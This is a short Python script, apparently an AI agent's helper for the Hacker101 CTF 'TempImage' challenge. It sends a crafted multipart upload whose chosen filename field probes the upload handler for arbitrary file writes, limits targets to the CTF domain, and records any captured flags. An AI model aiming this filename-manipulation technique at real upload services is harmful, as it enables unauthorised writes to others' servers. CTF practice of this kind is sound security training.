"""Send one scoped TempImage test upload with a chosen form filename."""

import http.client
import json
import re
import sys
import urllib.parse
from pathlib import Path


base = urllib.parse.urlsplit(sys.argv[1])
chosen_name = sys.argv[2]
image_path = Path(sys.argv[3])
if base.scheme != "https" or not base.hostname.endswith(".ctf.hacker101.com"):
    raise ValueError("Only the active Hacker101 CTF instance is allowed")

boundary = "codex-tempimage-test"
image = image_path.read_bytes()
parts = [
    f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{image_path.name}\"\r\nContent-Type: image/png\r\n\r\n".encode(),
    image,
    f"\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n{chosen_name}\r\n--{boundary}--\r\n".encode(),
]
body = b"".join(parts)
connection = http.client.HTTPSConnection(base.hostname, timeout=20)
connection.request("POST", base.path.rstrip("/") + "/doUpload.php", body=body, headers={
    "Content-Type": f"multipart/form-data; boundary={boundary}",
    "Content-Length": str(len(body)),
})
response = connection.getresponse()
raw = response.read().decode("utf-8", "replace")
location = response.getheader("Location", "")
flags = re.findall(r"\^FLAG\^[0-9a-f]+\$FLAG\$", raw + location, re.I)
if flags:
    Path("tempimage-pending-flag.json").write_text(json.dumps({"flags": flags}), encoding="utf-8")
safe = re.sub(r"\^FLAG\^[0-9a-f]+\$FLAG\$", "^FLAG^[redacted]$FLAG$", raw + location, flags=re.I)
print(json.dumps({"status": response.status, "flag_count": len(flags), "response_excerpt": re.sub(r"<[^>]+>", " ", safe)[:350]}))

